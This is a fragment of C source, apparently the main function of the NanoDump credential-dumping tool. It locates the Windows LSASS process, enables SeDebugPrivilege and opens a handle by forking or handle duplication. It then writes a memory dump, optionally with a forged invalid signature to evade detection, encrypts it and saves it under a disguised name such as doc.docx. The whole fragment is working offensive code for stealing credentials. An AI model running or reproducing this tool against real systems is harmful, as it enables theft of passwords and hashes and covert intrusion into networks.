    if (get_pid_and_leave)
    {
        DWORD pid = get_lsass_pid();
        if (!pid)
        {
            printf("Failed to find the PID of LSASS.\n");
            return -1;
        }
        printf("LSASS PID: %ld\n", pid);
        return 0;
    }

    if (!dump_name)
    {
        printf("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx\n\n");
        usage(argv[0]);
        return -1;
    }

    if (dup && fork)
    {
        printf("Can't set both --dup and --fork\n");
        return -1;
    }

    if (fork && !pid)
    {
        printf("Process forking requires a PID. Run with --getpid first.\n");
        return -1;
    }

    if (dup && !pid)
    {
        printf("Handle duplication requires a PID. Run with --getpid first.\n");
        return -1;
    }

    // set the signature
    if (use_valid_sig)
    {
        Signature = MINIDUMP_SIGNATURE;
        Version = MINIDUMP_VERSION;
        ImplementationVersion = MINIDUMP_IMPL_VERSION;
    }
    else
    {
        generate_invalid_sig(
            &Signature,
            &Version,
            &ImplementationVersion
        );
    }

    success = enable_debug_priv();
    if (!success)
    {
        printf(
            "Could not enable 'SeDebugPrivilege'\n"
        );
        return -1;
    }

    HANDLE hProcess = obtain_lsass_handle(
        pid,
        fork,
        dup
    );
    if (!hProcess)
        return -1;

    // allocate a chuck of memory to write the dump
    SIZE_T RegionSize = DUMP_MAX_SIZE;
    PVOID BaseAddress = allocate_memory(&RegionSize);
    if (!BaseAddress)
    {
        NtClose(hProcess); hProcess = NULL;
        return -1;
    }

    dump_context dc;
    dc.hProcess = hProcess;
    dc.BaseAddress = BaseAddress;
    dc.rva = 0;
    dc.DumpMaxSize = RegionSize;
    dc.Signature = Signature;
    dc.Version = Version;
    dc.ImplementationVersion = ImplementationVersion;

    success = NanoDumpWriteDump(&dc);

    // close the handle
    NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;

    // at this point, you can encrypt or obfuscate the dump
    encrypt_dump(&dc);

    if (success)
    {
        success = write_file(
            dump_name,
            dc.BaseAddress,
            dc.rva
        );
    }

    erase_dump_from_memory(&dc);

    if (success)
    {
        print_success(
            dump_name,
            use_valid_sig,
            TRUE,
            FALSE
        );
        return 0;
    }
    else
    {
        return -1;
    }
}

#endif
